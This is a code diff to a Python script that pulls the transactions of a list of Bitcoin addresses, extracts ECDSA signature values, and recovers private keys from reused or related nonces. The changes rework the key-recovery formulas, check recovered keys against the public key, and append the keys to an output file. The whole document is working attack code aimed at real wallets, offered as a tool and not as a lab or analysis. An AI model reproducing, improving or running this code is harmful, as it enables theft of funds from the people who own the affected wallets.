@@ -3,7 +3,7 @@ import hashlib
 import json
 import argparse
 import time
-from urllib.request import urlopen
+from urllib.request import Request, urlopen
 import secp256k1 as ice
 
 G = ice.scalar_multiplication(1)
@@ -11,13 +11,19 @@ N = ice.N
 ZERO = ice.Zero
 DEFAULT_RETRIES = 3
 RETRY_BACKOFF = 1.5
+HTTP_TIMEOUT = 20
+HTTP_RETRIES = DEFAULT_RETRIES
 PREVOUT_CACHE = {}
 
-def getk1(r1, s1, z1, r2, s2, z2, diff):
-    return ((z1 * s2 - z2 * s1) * inv(r1 * (s1 - s2))) % N
+def getk1(r1, s1, z1, r2, s2, z2, m):
+    nr = (s2 * m * r1 + z1 * r2 - z2 * r1) % N
+    dr = (s1 * r2 - s2 * r1) % N
+    return (nr * inv(dr)) % N
 
-def getpvk(r1, s1, z1, r2, s2, z2, diff):
-    return ((z1 * s2 - z2 * s1) * inv(r1 * (s1 - s2)) + diff) % N
+def getpvk(r1, s1, z1, r2, s2, z2, m):
+    x1 = (s2 * z1 - s1 * z2 + m * s1 * s2) % N
+    xi = inv((s1 * r2 - s2 * r1) % N)
+    return (x1 * xi) % N
 
 def get_rs(sig):
     """Parse DER-encoded signature (hex) and ignore any trailing sighash byte."""
@@ -104,7 +110,12 @@ def parse_transaction(txn):
         idx += 8
         r = s = pub = None
         if script_len:
-            r, s, pub = split_sig_pieces(script)
+            try:
+                r, s, pub = split_sig_pieces(script)
+            except (ValueError, AssertionError, IndexError):
+                # Non-standard or malformed scriptSigs may not contain a
+                # parseable signature; keep the input and continue parsing.
+                pass
         inputs.append({'prev_out': prv_out, 'var0': var0, 'r': r, 's': s, 'pub': pub, 'seq': seq, 'witness': [], 'script_sig': script})
 
     out_cnt, idx = read_varint(txn, idx)
@@ -140,13 +151,15 @@ def parse_transaction(txn):
 
 def http_get(url):
     delay = RETRY_BACKOFF
-    for attempt in range(1, DEFAULT_RETRIES + 1):
+    for attempt in range(1, HTTP_RETRIES + 1):
         try:
-            return urlopen(url, timeout=20).read().decode('utf-8')
+            request = Request(url, headers={'User-Agent': 'RSZ-Scanner/1.0'})
+            with urlopen(request, timeout=HTTP_TIMEOUT) as response:
+                return response.read().decode('utf-8')
         except KeyboardInterrupt:
             raise
         except Exception as exc:
-            if attempt == DEFAULT_RETRIES:
+            if attempt == HTTP_RETRIES:
                 raise ConnectionError(f"Error fetching url after retries: {exc}")
             time.sleep(delay)
             delay *= RETRY_BACKOFF
@@ -455,12 +468,19 @@ def find_duplicates_and_prepare_bsgs_table(rL, sL, zL, QL):
 
     return solvable_diff
 
-def get_private_keys(rL, sL, zL, solvable_diff):
+def get_private_keys(rL, sL, zL, QL, solvable_diff):
     private_keys = []
     for i in solvable_diff:
         diff_val = i[2]
         k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], diff_val)
         d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], diff_val)
+        expected_Q = QL[i[0]]
+        if expected_Q != QL[i[1]]:
+            print(f'Ignoring candidate for inputs {i[0]} and {i[1]}: public keys differ')
+            continue
+        if ice.scalar_multiplication(d) != expected_Q:
+            print(f'Ignoring candidate for inputs {i[0]} and {i[1]}: private key verification failed')
+            continue
         private_keys.append(hex(d))
     return private_keys
 
@@ -473,43 +493,87 @@ def read_addresses_from_file(filename):
     except Exception as e:
         raise FileNotFoundError(f"Error reading file {filename}: {e}")
 
-def write_keys_to_file(addresses, private_keys):
+def write_keys_to_file(output_path, addresses, private_keys):
     try:
-        with open('private_keys.txt', 'a') as file:
+        with open(output_path, 'a', encoding='utf-8') as file:
             for address, private_key in zip(addresses, private_keys):
                 file.write(f"Address: {address}, Private Key: {private_key}\n")
+        return len(private_keys)
     except Exception as e:
-        print(f"Error writing to file: {e}")
+        print(f"Error writing keys to {output_path}: {e}")
+        return 0
 
-def main(filename):
+def main(filename, output_path='private_keys.txt', timeout=20, retries=3, retry_backoff=1.5):
+    global HTTP_TIMEOUT, HTTP_RETRIES, RETRY_BACKOFF
+    HTTP_TIMEOUT = timeout
+    HTTP_RETRIES = retries
+    RETRY_BACKOFF = retry_backoff
     addresses = read_addresses_from_file(filename)
-    for address in addresses:
-        print(f"\nProcessing address: {address}")
-        try:
-            txid, cdx, prevouts = check_transactions(address)
-            if not txid:
-                print('No inputs found for this address; skipping.')
+    summary = {
+        'processed': 0,
+        'failed': 0,
+        'no_transactions': 0,
+        'no_recovery': 0,
+        'recovered': 0,
+        'saved': 0,
+    }
+    total = len(addresses)
+    try:
+        for index, address in enumerate(addresses, start=1):
+            if not address:
                 continue
-            rL, sL, zL, QL = get_r_s_z_q_lists(txid, cdx, prevouts)
-            solvable_diff = find_duplicates_and_prepare_bsgs_table(rL, sL, zL, QL)
-            if not solvable_diff:
-                print('No duplicate R found for this address.')
-                continue
-            private_keys = get_private_keys(rL, sL, zL, solvable_diff)
-            write_keys_to_file([address]*len(private_keys), private_keys)
-        except ConnectionError as ce:
-            print(f'Skipping address {address} due to network error: {ce}')
-            continue
-        except KeyboardInterrupt:
-            print('Interrupted by user, stopping.'); return
-        except Exception as e:
-            print(f'Unhandled error for address {address}: {type(e).__name__}: {e}')
-            continue
+            summary['processed'] += 1
+            print(f"\n[{index}/{total}] Processing address: {address}")
+            try:
+                txid, cdx, prevouts = check_transactions(address)
+                if not txid:
+                    print('No inputs found for this address; skipping.')
+                    summary['no_transactions'] += 1
+                    continue
+                rL, sL, zL, QL = get_r_s_z_q_lists(txid, cdx, prevouts)
+                solvable_diff = find_duplicates_and_prepare_bsgs_table(rL, sL, zL, QL)
+                if not solvable_diff:
+                    print('No duplicate R found for this address.')
+                    summary['no_recovery'] += 1
+                    continue
+                private_keys = get_private_keys(rL, sL, zL, QL, solvable_diff)
+                summary['recovered'] += len(private_keys)
+                saved = write_keys_to_file(output_path, [address] * len(private_keys), private_keys)
+                summary['saved'] += saved
+            except ConnectionError as ce:
+                print(f'Skipping address {address} due to network error: {ce}')
+                summary['failed'] += 1
+            except KeyboardInterrupt:
+                raise
+            except Exception as e:
+                print(f'Unhandled error for address {address}: {type(e).__name__}: {e}')
+                summary['failed'] += 1
+    except KeyboardInterrupt:
+        print('\nInterrupted by user; showing partial summary.')
+
+    print('\nRun summary:')
+    print(f"  Addresses in file: {total}")
+    print(f"  Addresses processed: {summary['processed']}")
+    print(f"  Failed: {summary['failed']}")
+    print(f"  With no transactions: {summary['no_transactions']}")
+    print(f"  With no recovery candidate: {summary['no_recovery']}")
+    print(f"  Verified keys recovered: {summary['recovered']}")
+    print(f"  Keys saved to {output_path}: {summary['saved']}")
     print('Program Finished ...')
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='This tool helps to get ECDSA Signature r,s,z values from Bitcoin Address. Also attempts to solve for privatekey using Rvalues successive differencing mathematics using bsgs table in RAM.',
                                      epilog='Enjoy the program! :) ')
     parser.add_argument("-f", "--file", help="Path to the text file containing wallet addresses, one per line", required=True)
+    parser.add_argument("-o", "--output", default="private_keys.txt", help="File to append verified private keys to (default: private_keys.txt)")
+    parser.add_argument("--timeout", type=float, default=20, help="HTTP timeout in seconds (default: 20)")
+    parser.add_argument("--retries", type=int, default=3, help="Maximum HTTP attempts per request (default: 3)")
+    parser.add_argument("--retry-backoff", type=float, default=1.5, help="Multiplier for retry delay (default: 1.5)")
     args = parser.parse_args()
-    main(args.file)
+    if args.timeout <= 0:
+        parser.error('--timeout must be greater than 0')
+    if args.retries < 1:
+        parser.error('--retries must be at least 1')
+    if args.retry_backoff < 1:
+        parser.error('--retry-backoff must be at least 1')
+    main(args.file, args.output, args.timeout, args.retries, args.retry_backoff)
